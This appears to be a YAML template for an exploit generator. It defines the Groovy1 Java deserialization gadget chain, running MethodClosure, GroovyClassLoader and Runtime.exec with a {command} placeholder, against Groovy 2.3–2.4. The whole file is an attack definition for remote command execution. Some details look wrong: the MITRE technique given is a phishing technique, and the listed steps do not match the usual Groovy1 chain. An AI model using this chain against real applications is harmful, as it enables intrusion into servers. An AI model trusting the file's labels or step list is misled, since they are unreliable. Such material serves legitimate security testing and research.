name: "Groovy1"
category: "groovy"
description: "Groovy1 gadget chain using MethodClosure and GroovyClassLoader"
jdk_version: "all"
dependencies:
  - name: "groovy"
    version: "2.3-2.4"
exploit_type: "command_execution"
payload_type: "command"
risk_level: 5
mitre_technique: "T1566.001"
references:
  - "https://github.com/frohoff/ysoserial"
steps:
  - class_name: "org.codehaus.groovy.runtime.MethodClosure"
    method_name: "call"
    parameters: []
  - class_name: "groovy.lang.GroovyClassLoader"
    method_name: "parseClass"
    parameters:
      - "{command}"
  - class_name: "java.lang.Runtime"
    method_name: "exec"
    parameters:
      - "{command}"
